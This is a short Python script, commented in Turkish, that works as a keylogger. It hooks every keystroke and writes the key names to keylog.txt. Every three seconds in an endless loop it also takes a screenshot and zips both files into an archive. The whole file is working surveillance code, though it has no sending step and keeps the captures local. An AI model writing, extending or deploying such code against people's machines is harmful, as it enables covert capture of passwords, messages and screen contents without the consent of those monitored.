import time
import keyboard
import pyautogui
import os
import zipfile
import glob


  
 #except Exception as a:
 #   print(("hata oluştu"),str(a))

#  txt dosyasının kurulumu ve ziplenecek dosyalar için boş dizi ataması
#--------------------------------

log_file = "keylog.txt"
ziplenecek_dosyalar=[]

#---------------------------------

# txt dosyasının içeriğinin temizlenmesi
#-------------------------------------
with open(log_file, "w") as file:
    file.truncate(0)
#-------------------------------

 # ekran görüntüsü alımı
 # -----------------------------

def save_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
 #---------------------------


# dosyaları zip haline getirme
#--------------------------------------------

def dosya_zipleme():
    zip_dosyası="birleştirme.zip"
    zipf = zipfile.ZipFile(zip_dosyası, "w", zipfile.ZIP_DEFLATED)

    png_file = "screenshot.png"
    txt_file = "keylog.txt"

    zipf.write(png_file, "screenshot.png")
    zipf.write(txt_file, "keylog.txt")

    zipf.close()
#---------------------------------    

# txt dosyasına yazdırma işlemi
#----------------------------

def on_key_event(e):
    with open(log_file, "a") as file:
        file.write(str(e.name))
        file.write("\n")

#--------------------------------    

keyboard.hook(on_key_event)

while True:
    save_screenshot()
    dosya_zipleme()  
    time.sleep(3) # zaman aşımı 


 


